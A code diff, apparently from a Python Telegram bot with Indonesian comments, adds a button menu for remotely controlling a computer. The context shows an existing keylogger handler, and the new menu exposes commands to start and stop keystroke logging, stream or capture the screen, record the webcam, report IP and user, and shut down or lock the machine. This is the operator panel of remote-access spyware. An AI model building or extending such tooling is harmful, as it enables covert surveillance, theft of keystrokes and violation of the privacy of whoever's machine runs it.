@@ -1,4 +1,6 @@
 import telebot
+from telebot.types import ReplyKeyboardMarkup, KeyboardButton
+
 import time
 import psutil
 
@@ -26,6 +28,7 @@ if not IP_SERVER:
 class TelegramBot:
     def __init__(self, token):
         self.bot = telebot.TeleBot(token)
+        self.create_menu()
 
         # Fungsi untuk menangani command /keylogger start atau /keylogger stop
         @self.bot.message_handler(commands=['keylogger'])
@@ -235,6 +238,116 @@ class TelegramBot:
             except Exception as e:
                 print(f"Error saat memulai berbagi layar: {e}")
                 self.bot.send_message(message.chat.id, "Gagal memulai berbagi layar. Coba lagi nanti.")
+
+    def create_menu(self):
+        @self.bot.message_handler(commands=['start', 'menu'])
+        def send_main_menu(message):
+            markup = ReplyKeyboardMarkup(resize_keyboard=True)
+
+            # Tombol kategori (Sub-menu)
+            btn_system = KeyboardButton("🖥 Sistem")
+            btn_monitoring = KeyboardButton("📊 Monitoring")
+            btn_actions = KeyboardButton("⚙️ Aksi Lainnya")
+            btn_interaction = KeyboardButton("💬 Interaksi")
+
+            markup.row(btn_system, btn_monitoring)
+            markup.row(btn_actions, btn_interaction)
+
+            self.bot.send_message(message.chat.id, "Pilih kategori:", reply_markup=markup)
+
+        @self.bot.message_handler(func=lambda message: message.text == "🖥 Sistem")
+        def system_menu(message):
+            markup = ReplyKeyboardMarkup(resize_keyboard=True)
+
+            # Sub-menu Sistem
+            btn_shutdown = KeyboardButton("/shutdown")
+            btn_restart = KeyboardButton("/restart")
+            btn_hibernate = KeyboardButton("/hibernate")
+            btn_lock = KeyboardButton("/lock")
+            btn_back = KeyboardButton("⬅️ Kembali ke Menu Utama")
+
+            markup.row(btn_shutdown, btn_restart)
+            markup.row(btn_hibernate, btn_lock)
+            markup.row(btn_back)
+
+            self.bot.send_message(message.chat.id, "Menu Sistem:", reply_markup=markup)
+
+        @self.bot.message_handler(func=lambda message: message.text == "📊 Monitoring")
+        def monitoring_menu(message):
+            markup = ReplyKeyboardMarkup(resize_keyboard=True)
+
+            # Sub-menu Monitoring
+            btn_battery = KeyboardButton("/battery")
+            btn_cpu = KeyboardButton("/cpu")
+            btn_ram = KeyboardButton("/ram")
+            btn_ip = KeyboardButton("/ip")
+            btn_whoami = KeyboardButton("/whoami")
+            btn_back = KeyboardButton("⬅️ Kembali ke Menu Utama")
+
+            markup.row(btn_battery, btn_cpu, btn_ram)
+            markup.row(btn_ip, btn_whoami)
+            markup.row(btn_back)
+
+            self.bot.send_message(message.chat.id, "Menu Monitoring:", reply_markup=markup)
+
+        @self.bot.message_handler(func=lambda message: message.text == "⚙️ Aksi Lainnya")
+        def actions_menu(message):
+            markup = ReplyKeyboardMarkup(resize_keyboard=True)
+
+            # Sub-menu Aksi Lainnya
+            btn_keylogger_start = KeyboardButton("/keylogger start")
+            btn_keylogger_stop = KeyboardButton("/keylogger stop")
+            btn_sharescreen_start = KeyboardButton("/sharescreen start")
+            btn_sharescreen_stop = KeyboardButton("/sharescreen stop")
+            btn_capture = KeyboardButton("/capture desktop")
+            btn_records = KeyboardButton("/records webcam 5")
+            btn_back = KeyboardButton("⬅️ Kembali ke Menu Utama")
+
+            markup.row(btn_keylogger_start, btn_keylogger_stop)
+            markup.row(btn_sharescreen_start, btn_sharescreen_stop)
+            markup.row(btn_capture, btn_records)
+            markup.row(btn_back)
+
+            self.bot.send_message(message.chat.id, "Menu Aksi Lainnya:", reply_markup=markup)
+
+        @self.bot.message_handler(func=lambda message: message.text == "💬 Interaksi")
+        def interaction_menu(message):
+            markup = ReplyKeyboardMarkup(resize_keyboard=True)
+
+            # Tombol untuk memicu input teks
+            btn_say = KeyboardButton("/say")  # Tidak langsung menyertakan teks
+            btn_ask = KeyboardButton("/ask")  # Juga hanya tombol pemicu
+            btn_back = KeyboardButton("⬅️ Kembali ke Menu Utama")
+
+            markup.row(btn_say, btn_ask)
+            markup.row(btn_back)
+
+            self.bot.send_message(message.chat.id, "Menu Interaksi:", reply_markup=markup)
+
+        @self.bot.message_handler(func=lambda message: message.text == "/say")
+        def ask_say_text(message):
+            self.bot.send_message(message.chat.id, "Silakan ketik teks yang ingin dikirim:")
+            self.bot.register_next_step_handler(message, send_say_text)
+
+        def send_say_text(message):
+            text_to_say = message.text  # Teks yang diketik pengguna
+            say_text(text_to_say)
+            self.bot.send_message(message.chat.id, f"Mengucapkan: {text_to_say}")
+
+        @self.bot.message_handler(func=lambda message: message.text == "/ask")
+        def ask_ask_text(message):
+            self.bot.send_message(message.chat.id, "Silakan ketik pertanyaan yang ingin Anda tanyakan:")
+            self.bot.register_next_step_handler(message, send_ask_text)
+
+        def send_ask_text(message):
+            question = message.text  # Teks yang diketik pengguna
+            answer_ai = ask_question(question)
+            self.bot.send_message(message.chat.id, f"answer: {answer_ai}") 
+
+
+        @self.bot.message_handler(func=lambda message: message.text == "⬅️ Kembali ke Menu Utama")
+        def back_to_main_menu(message):
+            send_main_menu(message)
 
     def start(self):
         self.bot.infinity_polling()
